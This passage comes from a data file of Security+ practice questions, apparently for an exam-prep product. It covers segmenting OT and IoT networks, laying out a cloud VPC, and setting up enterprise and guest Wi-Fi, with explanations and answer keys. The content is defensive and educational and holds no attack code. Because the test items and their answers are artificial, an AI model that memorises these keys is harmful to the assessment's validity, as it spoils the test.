            "ip": "10.70.100.2",
            "mask": "255.255.255.0",
            "x": 4,
            "y": 1
          }
        ],
        "links": [
          {
            "from": "hq",
            "to": "sw1"
          },
          {
            "from": "sw1",
            "to": "fw1"
          },
          {
            "from": "fw1",
            "to": "sw2"
          },
          {
            "from": "sw2",
            "to": "fw2"
          },
          {
            "from": "fw2",
            "to": "sw3"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "categorize",
        "points": 1,
        "prompt": "Drag each system into the segment where it belongs.",
        "explanation": "The OT network holds only what the process needs to run: the PLC, the operator HMI and the historian that polls the PLCs every second. ERP-1 is ordinary business IT. The industrial DMZ holds the systems whose job is to exchange something across the boundary. HIST-2 lets finance read production data without touching OT, and RAS-1 gives the vendor a landing point that FW-2 can tightly control. HIST-1 is the tempting mistake. It feels like a reporting system, but it polls the PLCs constantly, so moving it out of OT would mean a permanent flow from outside into the control network.",
        "payload": {
          "items": [
            {
              "id": "hist2",
              "label": "HIST-2 · read-only copy of historian data for business reporting"
            },
            {
              "id": "plc",
              "label": "PLC-1 · controls the dosing pumps"
            },
            {
              "id": "erp",
              "label": "ERP-1 · finance and ERP system"
            },
            {
              "id": "ras",
              "label": "RAS-1 · host where the vendor's remote sessions land"
            },
            {
              "id": "hmi",
              "label": "HMI-1 · operator console for the pumps"
            },
            {
              "id": "hist1",
              "label": "HIST-1 · historian polling every PLC each second"
            }
          ],
          "buckets": [
            {
              "id": "it",
              "label": "Corporate IT (SW-1)"
            },
            {
              "id": "idmz",
              "label": "Industrial DMZ (SW-2)"
            },
            {
              "id": "ot",
              "label": "OT control (SW-3)"
            }
          ]
        },
        "answer": {
          "map": {
            "hist2": "idmz",
            "plc": "ot",
            "erp": "it",
            "ras": "idmz",
            "hmi": "ot",
            "hist1": "ot"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Decide how data and people cross into OT.",
        "explanation": "Nothing on the corporate side should open a connection into OT. With HIST-1 pushing to HIST-2, data leaves OT on a path FW-2 can restrict to one source, one destination and one port, and finance never touches the control network. Modbus/TCP has no authentication, so letting ERP-1 talk to the PLC directly hands control-network access to anyone who compromises the ERP system. RDP into the HMI does the same with an interactive session. For the vendor, a permanent tunnel or a modem on the PLC both go around FW-2 entirely. Landing on RAS-1 keeps vendor access time-limited, authenticated, recorded and filtered.",
        "payload": {
          "slots": [
            {
              "id": "figures",
              "label": "How production figures reach ERP-1",
              "options": [
                {
                  "id": "modbus",
                  "text": "ERP-1 reads the counters straight from PLC-1 over Modbus/TCP"
                },
                {
                  "id": "rdp",
                  "text": "An office PC signs in to HMI-1 over RDP each morning and exports a report"
                },
                {
                  "id": "mirror",
                  "text": "HIST-1 pushes readings out to HIST-2, and ERP-1 reads only from HIST-2"
                }
              ]
            },
            {
              "id": "vendor",
              "label": "How the vendor reaches PLC-1",
              "options": [
                {
                  "id": "perm",
                  "text": "A permanent site-to-site VPN from the vendor straight into the OT network"
                },
                {
                  "id": "ras",
                  "text": "VPN to RAS-1 with MFA, switched on per job and recorded"
                },
                {
                  "id": "modem",
                  "text": "A 4G modem plugged into PLC-1 so the vendor can dial in directly"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "figures": "mirror",
            "vendor": "ras"
          }
        }
      },
      {
        "id": "s3",
        "type": "configure",
        "points": 1,
        "prompt": "PLC-1's firmware is out of support and the vendor will not patch it again. Choose the compensating controls.",
        "explanation": "When a system cannot be patched, you shrink who can reach it and watch it closely. Limiting PLC-1 to the systems that legitimately talk to it means an attacker has to compromise one of those first. A PLC cannot run an EDR agent, and a nightly reboot interrupts the process it controls while doing nothing about the flaw. Active scanning is the OT-specific trap. Fragile controllers can hang or fault when they are scanned, so in a live plant the safer choice is passive monitoring of a traffic copy.",
        "payload": {
          "slots": [
            {
              "id": "contain",
              "label": "Containment",
              "options": [
                {
                  "id": "edr",
                  "text": "Install an EDR agent on PLC-1 to catch malware in real time"
                },
                {
                  "id": "reboot",
                  "text": "Reboot PLC-1 nightly to clear anything resident in memory"
                },
                {
                  "id": "acl",
                  "text": "Let only HMI-1, HIST-1 and approved maintenance reach PLC-1"
                }
              ]
            },
            {
              "id": "watch",
              "label": "Monitoring",
              "options": [
                {
                  "id": "passive",
                  "text": "Passively monitor a SPAN copy of OT traffic"
                },
                {
                  "id": "scan",
                  "text": "Run active vulnerability scans against PLC-1 weekly"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "contain": "acl",
            "watch": "passive"
          }
        }
      }
    ]
  },

  {
    "id": "sp-dg-07",
    "cert": "secplus",
    "objective": "3.1",
    "topic": "IoT and embedded systems",
    "title": "Sort out the smart-building network",
    "estMinutes": 5,
    "archetype": "diagram",
    "scenario": "Cobalt Studios has moved into a smart building, and right now everything shares one flat network: staff laptops, the finance file server, eight IP cameras, the HVAC controller, the door badge readers and visitors' phones on the guest Wi-Fi. The building devices run embedded firmware their manufacturers patch rarely, if ever, and two of the cameras still had their factory passwords. The redesign splits the network into three segments behind FW-1.",
    "assets": {
      "reference": {
        "kind": "network",
        "devices": [
          {
            "id": "inet",
            "label": "INTERNET",
            "type": "box",
            "x": 2,
            "y": 0
          },
          {
            "id": "fw1",
            "label": "FW-1",
            "type": "firewall",
            "x": 2,
            "y": 1
          },
          {
            "id": "sw1",
            "label": "SW-1",
            "type": "switch",
            "zone": "staff LAN",
            "ip": "10.80.1.2",
            "mask": "255.255.255.0",
            "x": 0,
            "y": 1
          },
          {
            "id": "sw2",
            "label": "SW-2",
            "type": "switch",
            "zone": "IoT segment",
            "ip": "10.80.20.2",
            "mask": "255.255.255.0",
            "x": 1,
            "y": 3
          },
          {
            "id": "ap1",
            "label": "AP-1",
            "type": "box",
            "zone": "guest Wi-Fi",
            "ip": "10.80.99.2",
            "mask": "255.255.255.0",
            "x": 4,
            "y": 1
          }
        ],
        "links": [
          {
            "from": "inet",
            "to": "fw1"
          },
          {
            "from": "fw1",
            "to": "sw1"
          },
          {
            "from": "fw1",
            "to": "sw2"
          },
          {
            "from": "fw1",
            "to": "ap1"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "categorize",
        "points": 1,
        "prompt": "Drag each device group into the segment where it belongs.",
        "explanation": "The cameras, the HVAC controller and the badge readers share a profile: embedded firmware that rarely gets patched, weak defaults, and one narrow job. Grouping them on their own segment means a compromised camera cannot reach FIN-1 or a staff laptop. Visitors' devices are unmanaged and untrusted, so they get the guest network and nothing else. The staff laptops and the finance server stay together on the staff LAN, away from both.",
        "payload": {
          "items": [
            {
              "id": "cam",
              "label": "CAM-1 to CAM-8 · IP cameras"
            },
            {
              "id": "fin",
              "label": "FIN-1 · finance file server"
            },
            {
              "id": "vis",
              "label": "Visitors' phones and laptops"
            },
            {
              "id": "hvac",
              "label": "HVAC-1 · heating and cooling controller"
            },
            {
              "id": "lap",
              "label": "Design team laptops"
            },
            {
              "id": "badge",
              "label": "BADGE-1 · door badge readers"
            }
          ],
          "buckets": [
            {
              "id": "staff",
              "label": "Staff LAN (SW-1)"
            },
            {
              "id": "iot",
              "label": "IoT segment (SW-2)"
            },
            {
              "id": "guest",
              "label": "Guest Wi-Fi (AP-1)"
            }
          ]
        },
        "answer": {
          "map": {
            "cam": "iot",
            "fin": "staff",
            "vis": "guest",
            "hvac": "iot",
            "lap": "staff",
            "badge": "iot"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Set FW-1's policy for the new segments.",
        "explanation": "Guests get internet access and nothing else. Letting visitors print is not worth a path into the staff LAN. The IoT segment should never open connections to staff systems, because the whole point of separating it is that a compromised camera hits a wall. Outbound, the devices only need their own manufacturers' update services. Allowing everything lets a hijacked camera join a botnet or send footage anywhere, and opening inbound access from the internet is how exposed cameras end up found by internet-wide scanners for anyone to log in to.",
        "payload": {
          "slots": [
            {
              "id": "guest",
              "label": "Guest Wi-Fi",
              "options": [
                {
                  "id": "staff",
                  "text": "Internet plus the staff LAN, so visitors can print"
                },
                {
                  "id": "inet",
                  "text": "Internet only, no access to the other segments"
                },
                {
                  "id": "all",
                  "text": "Full access, since visitors are always accompanied"
                }
              ]
            },
            {
              "id": "iotStaff",
              "label": "IoT segment to staff LAN",
              "options": [
                {
                  "id": "deny",
                  "text": "Deny"
                },
                {
                  "id": "allow",
                  "text": "Allow, so the devices can reach staff systems when needed"
                }
              ]
            },
            {
              "id": "iotNet",
              "label": "IoT segment and the internet",
              "options": [
                {
                  "id": "any",
                  "text": "Allow all outbound traffic from the devices"
                },
                {
                  "id": "inbound",
                  "text": "Allow inbound so installers can manage devices remotely"
                },
                {
                  "id": "vendor",
                  "text": "Only outbound to each maker's update servers"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "guest": "inet",
            "iotStaff": "deny",
            "iotNet": "vendor"
          }
        }
      },
      {
        "id": "s3",
        "type": "configure",
        "points": 1,
        "prompt": "Reduce the cameras' attack surface.",
        "explanation": "Segmentation limits what a compromised device can reach. It does not stop the compromise. Factory passwords are published online, so they have to go even behind a firewall, and a shared password means one leaked camera unlocks all eight, so each gets its own. Every running service is another way in, and Telnet sends credentials in clear text. UPnP lets a device open inbound ports on any gateway that honors it, with nobody approving the change.",
        "payload": {
          "slots": [
            {
              "id": "creds",
              "label": "Credentials",
              "options": [
                {
                  "id": "one",
                  "text": "One strong password shared by all eight cameras"
                },
                {
                  "id": "keep",
                  "text": "Keep the factory passwords now that the cameras are segmented"
                },
                {
                  "id": "unique",
                  "text": "A unique strong password per camera, kept in the vault"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Services",
              "options": [
                {
                  "id": "off",
                  "text": "Disable Telnet, UPnP and every other service the cameras do not need"
                },
                {
                  "id": "upnp",
                  "text": "Turn on UPnP so the cameras can open the ports they need automatically"
                },
                {
                  "id": "all",
                  "text": "Leave every service running in case the installer needs it later"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "creds": "unique",
            "svc": "off"
          }
        }
      }
    ]
  },

  {
    "id": "sp-dg-08",
    "cert": "secplus",
    "objective": "3.1",
    "topic": "Cloud architecture",
    "title": "Lay out the claims app VPC",
    "estMinutes": 5,
    "archetype": "diagram",
    "scenario": "Rowan Mutual is moving its claims app into a cloud VPC, 10.0.0.0/16, with two subnets. Subnet 1 (10.0.1.0/24) has a route sending 0.0.0.0/0 to the internet gateway, IGW-1. Subnet 2 (10.0.2.0/24) has no route to IGW-1. Every resource, including the NAT gateway, is deployed into one of the two subnets. Customers reach the app over HTTPS through a load balancer. The app server and the database must not be reachable from the internet, but the app server has to download OS patches from the vendor's repository on the internet. Admins connect over SSH from the office range, 198.51.100.0/24, to a hardened host, then on to the servers.",
    "assets": {
      "reference": {
        "kind": "network",
        "devices": [
          {
            "id": "inet",
            "label": "INTERNET",
            "type": "box",
            "x": 3,
            "y": 0
          },
          {
            "id": "igw",
            "label": "IGW-1",
            "type": "router",
            "x": 2,
            "y": 0
          },
          {
            "id": "sub1",
            "label": "SUBNET 1",
            "type": "box",
            "zone": "VPC 10.0.0.0/16",
            "ip": "10.0.1.0/24",
            "x": 1,
            "y": 1
          },
          {
            "id": "sub2",
            "label": "SUBNET 2",
            "type": "box",
            "zone": "VPC 10.0.0.0/16",
            "ip": "10.0.2.0/24",
            "x": 2,
            "y": 1
          }
        ],
        "links": [
          {
            "from": "inet",
            "to": "igw"
          },
          {
            "from": "igw",
            "to": "sub1"
          },
          {
            "from": "sub1",
            "to": "sub2"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "categorize",
        "points": 1,
        "prompt": "Drag each resource into the subnet where it belongs.",
        "explanation": "Subnet 1 is the public subnet because its route table points at the internet gateway, so it holds only what the internet must reach or what needs that route for itself. LB-1 receives customer traffic and BAST-1 receives admin SSH. NAT-1 has to sit there too, because it forwards private instances' traffic out through IGW-1, and a NAT gateway in Subnet 2 would have no way out either. APP-1 and DB-1 go in the private subnet, where nothing on the internet can address them directly.",
        "payload": {
          "items": [
            {
              "id": "app",
              "label": "APP-1 · claims application server"
            },
            {
              "id": "nat",
              "label": "NAT-1 · NAT gateway"
            },
            {
              "id": "db",
              "label": "DB-1 · claims database"
            },
            {
              "id": "lb",
              "label": "LB-1 · load balancer receiving customers' HTTPS"
            },
            {
              "id": "bast",
              "label": "BAST-1 · hardened SSH host admins sign in to first"
            }
          ],
          "buckets": [
            {
              "id": "s1",
              "label": "Subnet 1 (10.0.1.0/24)"
            },
            {
              "id": "s2",
              "label": "Subnet 2 (10.0.2.0/24)"
            }
          ]
        },
        "answer": {
          "map": {
            "app": "s2",
            "nat": "s1",
            "db": "s2",
            "lb": "s1",
            "bast": "s1"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Finish the routing and the inbound rules.",
        "explanation": "Pointing Subnet 2's default route at NAT-1 lets APP-1 reach the patch repository while staying unreachable from outside. Point it at IGW-1 and Subnet 2 becomes a public subnet by definition, and with no default route at all patching fails. BAST-1 should accept SSH only from the office range, since SSH open to the whole internet draws constant brute-force attempts, and an RDP rule does nothing for admins who connect over SSH. DB-1 should accept database connections only from APP-1. Opening it to the whole VPC lets anything in either subnet, including the internet-facing hosts, try the database, and the load balancer never talks to the database at all.",
        "payload": {
          "slots": [
            {
              "id": "route",
              "label": "Subnet 2 route table: 0.0.0.0/0 goes to",
              "options": [
                {
                  "id": "igw",
                  "text": "IGW-1"
                },
                {
                  "id": "none",
                  "text": "Nowhere; leave no default route"
                },
                {
                  "id": "nat",
                  "text": "NAT-1"
                },
                {
                  "id": "lb",
                  "text": "LB-1"
                }
              ]
            },
            {
              "id": "bast",
              "label": "BAST-1 inbound rule",
              "options": [
                {
                  "id": "sshany",
                  "text": "TCP 22 from 0.0.0.0/0"
                },
                {
                  "id": "sshoffice",
                  "text": "TCP 22 from 198.51.100.0/24"
                },
                {
                  "id": "rdpoffice",
                  "text": "TCP 3389 from 198.51.100.0/24"
                },
                {
                  "id": "allany",
                  "text": "All traffic from 0.0.0.0/0"
                }
              ]
            },
            {
              "id": "db",
              "label": "DB-1 inbound rule for the database port",
              "options": [
                {
                  "id": "vpc",
                  "text": "TCP 5432 from the whole VPC, 10.0.0.0/16"
                },
                {
                  "id": "app",
                  "text": "TCP 5432 from APP-1 only"
                },
                {
                  "id": "lb",
                  "text": "TCP 5432 from LB-1"
                },
                {
                  "id": "any",
                  "text": "TCP 5432 from 0.0.0.0/0"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "route": "nat",
            "bast": "sshoffice",
            "db": "app"
          }
        }
      },
      {
        "id": "s3",
        "type": "analyze",
        "points": 1,
        "prompt": "What does NAT-1 do for APP-1?",
        "explanation": "A NAT gateway translates outbound connections from private instances to its own public address and lets only the replies back in. That is exactly what APP-1 needs for patching without becoming reachable. It never accepts new inbound connections, which is why customers come in through LB-1 instead. It does not encrypt anything, and APP-1 never gets a public address of its own, because it shares NAT-1's.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "Customers can reach APP-1 directly on TCP 443 through NAT-1"
            },
            {
              "id": "l2",
              "text": "It encrypts all traffic flowing between Subnet 1 and Subnet 2"
            },
            {
              "id": "l3",
              "text": "APP-1 can connect out, but the internet cannot connect in to it"
            },
            {
              "id": "l4",
              "text": "APP-1 gets its own permanent public IP address from it"
            }
          ]
        },
        "answer": {
          "selected": [
            "l3"
          ]
        }
      }
    ]
  },

  // ===== v8.157.0 — wireless security PBQs (wireless), SY0-701 4.1 3.2 2.4; two-reviewer gate passed 2026-10-11 =====
  {
    "id": "sp-wl-01",
    "cert": "secplus",
    "objective": "4.1",
    "topic": "Wireless AAA",
    "title": "The contractor who can still connect",
    "estMinutes": 5,
    "archetype": "wireless",
    "scenario": "Tern Logistics runs its staff SSID, Tern-Staff, on one shared passphrase. A contractor who left a month ago was spotted in the car park this week, still connected. The operations director wants every Wi-Fi login tied to a named directory account, so one person can be cut off without anyone else changing anything. A new server, AAA-1, will check logins against the directory, and the wireless controller, WLC-1, will pass each login to it. Work out what the fix needs, then configure Tern-Staff and the link between WLC-1 and AAA-1.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Tern Logistics · head office"
        },
        "devices": [
          {
            "id": "ap1",
            "label": "AP-1",
            "type": "ap",
            "zone": "office",
            "ip": "Tern-Staff",
            "x": 0,
            "y": 1
          },
          {
            "id": "lap",
            "label": "Staff laptops",
            "type": "pc",
            "zone": "office",
            "ip": "shared passphrase",
            "x": 0,
            "y": 2
          },
          {
            "id": "wlc",
            "label": "WLC-1",
            "type": "switch",
            "ip": "10.20.5.2",
            "x": 2,
            "y": 1
          },
          {
            "id": "aaa",
            "label": "AAA-1 (new)",
            "type": "server",
            "ip": "placement ?",
            "x": 4,
            "y": 1
          },
          {
            "id": "dir",
            "label": "Directory",
            "type": "server",
            "zone": "servers",
            "ip": "10.20.10.11",
            "x": 4,
            "y": 2
          },
          {
            "id": "exc",
            "label": "Ex-contractor",
            "type": "pc",
            "zone": "car park",
            "ip": "still connected",
            "x": 2,
            "y": 3,
            "state": "compromised"
          }
        ],
        "links": [
          {
            "from": "lap",
            "to": "ap1"
          },
          {
            "from": "ap1",
            "to": "wlc"
          },
          {
            "from": "wlc",
            "to": "aaa"
          },
          {
            "from": "aaa",
            "to": "dir"
          },
          {
            "from": "exc",
            "to": "ap1",
            "kind": "attack"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "analyze",
        "points": 1,
        "prompt": "The contractor still gets on a month after leaving. Which statements are true for the fix? Select all that apply.",
        "explanation": "A shared passphrase is one secret for everyone, so the only way to lock one person out is to change it on every device. 802.1X fixes that: the controller relays each login to the authentication server, which checks that person’s own directory account, so disabling one account blocks one person at their next login. The trap is WPA3-Personal. SAE makes the passphrase much harder to crack offline, but it is still one passphrase shared by everyone, so the contractor’s copy keeps working.",
        "payload": {
          "lines": [
            {
              "id": "l1",
              "text": "With one shared passphrase, removing a single person means re-keying every device."
            },
            {
              "id": "l2",
              "text": "WPA3-Personal would solve this on its own, because SAE gives each user a separate password."
            },
            {
              "id": "l3",
              "text": "Under 802.1X, WLC-1 relays each login to AAA-1, which checks the named directory account."
            },
            {
              "id": "l4",
              "text": "Once a leaver’s directory account is disabled, their next Wi-Fi login fails."
            }
          ]
        },
        "answer": {
          "selected": [
            "l1",
            "l3",
            "l4"
          ]
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "apId": "ap1",
        "require": {
          "security": "WPA3-Enterprise"
        },
        "prompt": "Configure Tern-Staff and the WLC-1 to AAA-1 link so every login is checked individually.",
        "explanation": "WPA3-Enterprise uses 802.1X, so each person signs in with their own account; WPA3-Personal and WPA2-Personal both keep one shared passphrase. 802.1X logins travel from the controller to the server over RADIUS, and RADIUS authentication uses UDP 1812. UDP 1813 is RADIUS accounting, and TCP 49 is TACACS+, which is built for administrator logins to network devices rather than Wi-Fi users. Kerberos is how the directory authenticates users to services, not how a controller hands off a Wi-Fi login. AAA-1 belongs on the internal server VLAN, accepting logins only from WLC-1. A public DMZ exposes it to the internet, and the staff Wi-Fi VLAN puts it within reach of every laptop. The shared secret lets WLC-1 and AAA-1 trust each other’s messages and protects the session keys AAA-1 sends back, so it should be long, random and unique to that controller. Reusing the old passphrase, which the contractor knows, or one short secret everywhere means a single leak exposes everything.",
        "payload": {
          "slots": [
            {
              "id": "security",
              "label": "Security mode",
              "options": [
                {
                  "id": "a",
                  "text": "WPA3-Personal"
                },
                {
                  "id": "b",
                  "text": "WPA3-Enterprise"
                },
                {
                  "id": "c",
                  "text": "WPA2-Personal"
                }
              ]
            },
            {
              "id": "proto",
              "label": "Protocol from WLC-1 to AAA-1",
              "options": [
                {
                  "id": "a",
                  "text": "TACACS+"
                },
                {
                  "id": "b",
                  "text": "Kerberos"
                },
                {
                  "id": "c",
                  "text": "RADIUS"
                }
              ]
            },
            {
              "id": "port",
              "label": "Authentication port on AAA-1",
              "options": [
                {
                  "id": "a",
                  "text": "UDP 1812"
                },
                {
                  "id": "b",
                  "text": "UDP 1813"
                },
                {
                  "id": "c",
                  "text": "TCP 49"
                }
              ]
            },
            {
              "id": "place",
              "label": "Where AAA-1 sits",
              "options": [
                {
                  "id": "a",
                  "text": "Public DMZ, reachable from anywhere"
                },
                {
                  "id": "b",
                  "text": "Server VLAN, logins accepted only from WLC-1"
                },
                {
                  "id": "c",
                  "text": "Staff Wi-Fi VLAN, beside the laptops"
                }
              ]
            },
            {
              "id": "secret",
              "label": "Shared secret on WLC-1 and AAA-1",
              "options": [
                {
                  "id": "a",
                  "text": "The old Tern-Staff passphrase"
                },
                {
                  "id": "b",
                  "text": "One short secret used on every device"
                },
                {
                  "id": "c",
                  "text": "Long random value unique to WLC-1"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "security": "b",
            "proto": "c",
            "port": "a",
            "place": "b",
            "secret": "c"
          }
        }
      }
    ]
  },

  {
    "id": "sp-wl-02",
    "cert": "secplus",
    "objective": "4.1",
    "topic": "Wireless authentication",
    "title": "Two kinds of device, one access point",
    "estMinutes": 5,
    "archetype": "wireless",
    "scenario": "Hollin Health is moving staff Wi-Fi off a shared passphrase. AP-1 will broadcast two SSIDs, and both will send logins to RAD-1. Hollin-Corp is for clinic laptops: company-owned, managed, and each already holding a device certificate from the internal CA. A phishing test last quarter captured several staff passwords, so the laptops must join without any password at all. Hollin-BYOD is for staff phones, which are personally owned and unmanaged. The company will not install certificates on them, so staff sign in there with their directory username and password. Every connection, on both SSIDs, must be tied to an individual identity. Work out what each group of devices can support, then configure both SSIDs.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Hollin Health · clinic floor"
        },
        "devices": [
          {
            "id": "lap",
            "label": "Clinic laptops",
            "type": "pc",
            "zone": "managed",
            "ip": "device cert",
            "x": 0,
            "y": 0
          },
          {
            "id": "phn",
            "label": "Staff phones",
            "type": "pc",
            "zone": "personal",
            "ip": "no certificate",
            "x": 0,
            "y": 2
          },
          {
            "id": "ap1",
            "label": "AP-1",
            "type": "ap",
            "ip": "two SSIDs",
            "x": 2,
            "y": 1
          },
          {
            "id": "rad",
            "label": "RAD-1",
            "type": "server",
            "zone": "servers",
            "ip": "10.40.0.10",
            "x": 4,
            "y": 1
          },
          {
            "id": "ca",
            "label": "Internal CA",
            "type": "server",
            "zone": "servers",
            "ip": "10.40.0.12",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "lap",
            "to": "ap1"
          },
          {
            "from": "phn",
            "to": "ap1"
          },
          {
            "from": "ap1",
            "to": "rad"
          },
          {
            "from": "rad",
            "to": "ca"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "analyze",
        "points": 1,
        "prompt": "Which statements about these two groups of devices are true? Select all that apply.",
        "explanation": "EAP-TLS is mutual certificate authentication. RAD-1 proves itself with its server certificate and the laptop proves itself with its device certificate, so there is no password to phish. PEAP needs a certificate only on the server. The client checks that certificate, a TLS tunnel forms, and the username-and-password exchange happens inside it. That makes the last line the trap: client certificates are an EAP-TLS requirement, not a PEAP one. It is also why the phones, which have no certificate, can use PEAP but not EAP-TLS.",
        "payload": {
          "lines": [
            {
              "id": "l1",
              "text": "EAP-TLS checks both the network and the device with certificates, so no password is used."
            },
            {
              "id": "l2",
              "text": "PEAP protects a username-and-password login inside a TLS tunnel set up with the server’s certificate."
            },
            {
              "id": "l3",
              "text": "A phone with no client certificate cannot complete EAP-TLS."
            },
            {
              "id": "l4",
              "text": "PEAP needs a certificate installed on every client device, just as EAP-TLS does."
            }
          ]
        },
        "answer": {
          "selected": [
            "l1",
            "l2",
            "l3"
          ]
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "apId": "ap1",
        "require": {
          "security": "WPA3-Enterprise"
        },
        "prompt": "Configure Hollin-Corp for the managed clinic laptops.",
        "explanation": "An individual identity on every connection means 802.1X, so the mode is WPA3-Enterprise; both Personal modes share one passphrase. The laptops already carry device certificates and must not use passwords, which rules out PEAP and leaves EAP-TLS. EAP-MD5 has no mutual authentication and cannot generate Wi-Fi encryption keys, so it is never an option for wireless. Under EAP-TLS a laptop’s credential is its certificate, so a lost laptop is cut off by revoking that certificate, provided RAD-1 checks the CA’s revocation list. Resetting the owner’s password does nothing because EAP-TLS never uses it, and renaming the SSID only disrupts everyone else.",
        "payload": {
          "slots": [
            {
              "id": "security",
              "label": "Security mode",
              "options": [
                {
                  "id": "a",
                  "text": "WPA2-Personal"
                },
                {
                  "id": "b",
                  "text": "WPA3-Enterprise"
                },
                {
                  "id": "c",
                  "text": "WPA3-Personal"
                }
              ]
            },
            {
              "id": "eap",
              "label": "Authentication method",
              "options": [
                {
                  "id": "a",
                  "text": "PEAP (MSCHAPv2)"
                },
                {
                  "id": "b",
                  "text": "EAP-MD5"
                },
                {
                  "id": "c",
                  "text": "EAP-TLS"
                }
              ]
            },
            {
              "id": "lost",
              "label": "When a laptop is lost",
              "options": [
                {
                  "id": "a",
                  "text": "Revoke its certificate at the internal CA"
                },
                {
                  "id": "b",
                  "text": "Reset the owner’s directory password"
                },
                {
                  "id": "c",
                  "text": "Rename the Hollin-Corp SSID"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "security": "b",
            "eap": "c",
            "lost": "a"
          }
        }
      },
      {
        "id": "s3",
        "type": "configure",
        "points": 1,
        "apId": "ap1",
        "require": {
          "security": "WPA3-Enterprise"
        },
        "prompt": "Configure Hollin-BYOD for the staff phones.",
        "explanation": "The phones also need an individual identity, so this SSID is WPA3-Enterprise too. Personally owned devices do not call for Personal mode, which would put everyone back on one passphrase, and an open SSID has no authentication at all. With no client certificates, EAP-TLS cannot work, so PEAP is the method that lets staff use their directory credentials. EAP-MD5 still offers no mutual authentication and no Wi-Fi keys. PEAP is only as strong as the phone’s check on the server. A phone that accepts any certificate will build its tunnel to an attacker’s server behind a fake access point and hand over the login, so each phone must verify RAD-1’s certificate and the CA that issued it before it sends anything.",
        "payload": {
          "slots": [
            {
              "id": "security",
              "label": "Security mode",
              "options": [
                {
                  "id": "a",
                  "text": "WPA3-Personal"
                },
                {
                  "id": "b",
                  "text": "Open"
                },
                {
                  "id": "c",
                  "text": "WPA3-Enterprise"
                }
              ]
            },
            {
              "id": "eap",
              "label": "Authentication method",
              "options": [
                {
                  "id": "a",
                  "text": "EAP-TLS"
                },
                {
                  "id": "b",
                  "text": "PEAP (MSCHAPv2)"
                },
                {
                  "id": "c",
                  "text": "EAP-MD5"
                }
              ]
            },
            {
              "id": "check",
              "label": "Before a phone sends its login",
              "options": [
                {
                  "id": "a",
                  "text": "Accept any certificate the network shows"
                },
                {
                  "id": "b",
                  "text": "Verify RAD-1’s certificate and its issuing CA"
                },
                {
                  "id": "c",
                  "text": "Skip the check; the tunnel protects the login"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "security": "c",
            "eap": "b",
            "check": "b"
          }
        }
      }
    ]
  },

  {
    "id": "sp-wl-03",
    "cert": "secplus",
    "objective": "3.2",
    "topic": "Guest wireless",
    "title": "Wi-Fi for the waiting room",
    "estMinutes": 4,
    "archetype": "wireless",
    "scenario": "Larkspur Dental wants to offer Wi-Fi to patients in the waiting room. AP-1 already broadcasts Larkspur-Staff, which puts staff devices on VLAN 10 with the practice server and the X-ray PC. The practice owner has three conditions. Visitors must accept the acceptable-use terms before they browse. Visitors must never reach anything on VLAN 10. One visitor’s phone must not be able to see another’s. Work out what the visitor network needs, then add it to AP-1.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Larkspur Dental · reception"
        },
        "devices": [
          {
            "id": "vis",
            "label": "Visitor phones",
            "type": "pc",
            "zone": "waiting room",
            "ip": "unknown devices",
            "x": 0,
            "y": 0
          },
          {
            "id": "ap1",
            "label": "AP-1",
            "type": "ap",
            "zone": "waiting room",
            "ip": "Larkspur-Staff",
            "x": 0,
            "y": 1
          },
          {
            "id": "inet",
            "label": "Internet",
            "type": "box",
            "x": 2,
            "y": 0
          },
          {
            "id": "fw",
            "label": "Firewall",
            "type": "firewall",
            "ip": "10.0.0.1",
            "x": 2,
            "y": 1
          },
          {
            "id": "srv",
            "label": "Practice server",
            "type": "server",
            "zone": "VLAN 10",
            "ip": "10.0.10.5",
            "x": 4,
            "y": 1
          },
          {
            "id": "xr",
            "label": "X-ray PC",
            "type": "pc",
            "zone": "VLAN 10",
            "ip": "10.0.10.21",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "vis",
            "to": "ap1"
          },
          {
            "from": "ap1",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "inet"
          },
          {
            "from": "fw",
            "to": "srv"
          },
          {
            "from": "fw",
            "to": "xr"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "analyze",
        "points": 1,
        "prompt": "Which statements about the visitor network are true? Select all that apply.",
        "explanation": "An SSID is only a name for a wireless network. What keeps visitors away from clinical systems is where their traffic lands: a separate VLAN with firewall rules that allow the internet and deny VLAN 10. That is why the first line is the trap. A new name on the same VLAN gives visitors the same reach as staff. Client isolation stops guest devices from talking to each other through the access point, so one infected phone cannot probe the next. A captive portal intercepts a new visitor’s first web request and holds them at the terms page until they accept.",
        "payload": {
          "lines": [
            {
              "id": "l1",
              "text": "Giving visitors their own SSID name is enough, on its own, to keep them off VLAN 10."
            },
            {
              "id": "l2",
              "text": "Visitor traffic should land on its own VLAN that the firewall lets out to the internet only."
            },
            {
              "id": "l3",
              "text": "Client isolation blocks traffic between devices on the same SSID."
            },
            {
              "id": "l4",
              "text": "A captive portal can hold each visitor at a terms page until they accept."
            }
          ]
        },
        "answer": {
          "selected": [
            "l2",
            "l3",
